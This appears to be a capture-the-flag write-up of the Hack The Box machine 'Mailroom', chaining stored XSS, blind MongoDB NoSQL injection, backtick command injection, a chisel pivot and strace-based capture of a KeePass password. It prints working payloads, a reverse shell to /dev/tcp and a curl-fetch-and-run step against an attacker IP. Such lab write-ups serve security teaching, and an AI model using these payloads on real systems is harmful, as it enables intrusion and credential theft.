---
layout: post
title: "HTB: Mailroom"
subtitle: "stored XSS to blind NoSQL injection for creds, then command injection and a strace of kpcli to root"
date: 2023-08-26
tags: [htb, linux, xss, nosql-injection, command-injection]
category: writeups
tldr: "Stored XSS in contact.php fires an XHR against an internal staff panel, which lets me hit auth.php and brute tristan's password through MongoDB NoSQL injection. SSH in, chisel to the internal vhost, command injection in inspect.php gets www-data, a leaked .git config gives matthew, and stracing his kpcli session captures the KeePass master password for root."
---

## the box

Mailroom is a Linux box. nmap gave me two ports:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
```

The site is `mailroom.htb`. Fuzzing vhosts turned up `git.mailroom.htb` running Gitea and `staff-review-panel.mailroom.htb`, whose `index.php` returned 403. The staff names listed on the site mattered later: Tristan Pitt, Matthew Conley, Chris McLovin, Vivien Perkins.

## recon

`contact.php` takes an inquiry and stores it, then serves it back from a path like `/inquiries/<hash>.html`. That stored content gets rendered when staff review it, which is the setup for stored XSS. The forbidden host `staff-review-panel.mailroom.htb` is only reachable from inside, so I needed the victim's browser to reach it for me.

The panel login posts to `/auth.php`. Its client JS sends the form to `auth.php` and reads back a JSON `message`. The backend uses `mongodb/mongodb` and a `findOne()` that is vulnerable to NoSQL injection.

## foothold

The plan: stored XSS in `contact.php` runs an `XMLHttpRequest` to the internal `auth.php`, then exfiltrates the response to my listener with a second request. That defeats the same-origin restriction because the script runs in the panel origin's context.

```js
<script>const x = new XMLHttpRequest();const x1 = new XMLHttpRequest();x.open("POST", 'http://staff-review-panel.mailroom.htb/auth.php');x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");x.onload = function() {x1.open('GET', 'http://10.10.16.65:8088/?='+atob(btoa(this.responseText)));x1.send();};const email = "administrator@mailroom.htb";const data = "email[$ne]=" + encodeURIComponent(email) + "&password[$ne]=anything";x.send(data);</script>
```

Sending `email[$ne]` and `password[$ne]` is the classic MongoDB operator-injection payload:

```json
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

The exfiltrated response confirmed the bypass:

```
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
```

`"success":true` means the auth condition passed. There was no way to grab the 2FA token or cookie, so I used the `success` flag as an oracle and brute-forced the email and password with NoSQL regex injection, character by character. I fed the JS directly into `contact.php` as `<script>code</script>` and caught the leaks on a `ncat -k` listener.

That recovered the email `tristan@mailroom.htb` and the password `69trisRulez!`.

```bash
ssh tristan@mailroom.htb   # 69trisRulez!
```

## user

Tristan can read `/var/mail/tristan`, which holds the 2FA links for `staff-review-panel.mailroom.htb/auth.php?token=...`. To actually reach that panel I pivoted with chisel:

```bash
# attacker
sudo ./chisel server -p 8088 -reverse -v
# tristan
./chisel client 10.10.16.65:8088 R:80:127.0.0.1:80
```

With `127.0.0.1 staff-review-panel.mailroom.htb` in my hosts file and a fresh token, I logged into `/inspect.php`. It runs:

```php
$inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
$contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

The filter strips a lot, but it leaves backticks untouched, so command substitution still works in both `inquiry_id` and `status_id`. I dropped a reverse shell file and pulled it through the injection:

```bash
echo "sh -i >& /dev/tcp/10.10.16.65/7777 0>&1" > rev.sh
sudo python3 -m http.server 9999
```

Then in `inspect.php`, `curl http://10.10.16.65:9999/rev.sh -o /tmp/rev.sh` followed by `bash /tmp/rev.sh` gave me `www-data`.

Inside `/var/www/staffroom/.git/config`:

```
url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
```

URL-decoded that is `matthew:HueLover83#`. `su matthew` worked, and matthew owns the user flag.

## root

In matthew's home were `personal.kdbx` (a KeePass database) and a `.kpcli-history` showing he runs `kpcli` interactively:

```
2023/04/21 03:25:32 CMD: UID=1001  PID=27815  | -bash -c /usr/bin/kpcli
2023/04/21 03:25:32 CMD: UID=1001  PID=27816  | /usr/bin/perl /usr/bin/kpcli
```

Since kpcli runs as a live process, I attached `strace` to it and read its input. The master password is typed into the running process, so the syscalls leak it:

```bash
strace -p `ps -ef | grep kpcli | awk '{ print $2 }'`
```

That captured the KeePass master password as it was entered. Opening the database revealed the root password, and `su root` gave me the root flag.

## takeaway

The web chain is one bug feeding the next: stored XSS exists only because reviewers render attacker content, and it is useful only because it can reach an internal host the attacker cannot. The NoSQL `success` flag is a perfectly good oracle even with no token in hand. On root, the lesson is that secrets typed into a running process you can `ptrace` are not secret. A blocklist that forgets backticks is the same mistake as no blocklist at all.
